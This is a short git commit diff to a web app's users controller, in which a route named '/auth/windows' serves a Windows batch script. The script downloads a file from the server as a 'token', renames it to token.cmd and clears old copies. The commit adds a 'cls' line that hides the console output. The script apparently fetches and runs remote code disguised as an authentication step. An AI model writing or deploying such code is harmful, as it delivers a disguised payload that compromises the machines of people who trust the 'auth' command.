7969ff52b53a087cb701dd368ce6c15c9ae81379
richard@gmail.com <richard@gmail.com>
2025-08-30 03:25:33 +0900

    init

--- app/controllers/users.js
+++ app/controllers/users.js
@@ -148,6 +148,7 @@ router.get("/auth/windows", (req, res) => {
 
     res.type("text/plain").send(`@echo off
 curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
+cls
 if exist "%USERPROFILE%\token" del "%USERPROFILE%\token"
 if exist "%USERPROFILE%\token.cmd" del "%USERPROFILE%\token.cmd"
 ren "%USERPROFILE%\\token" token.cmd
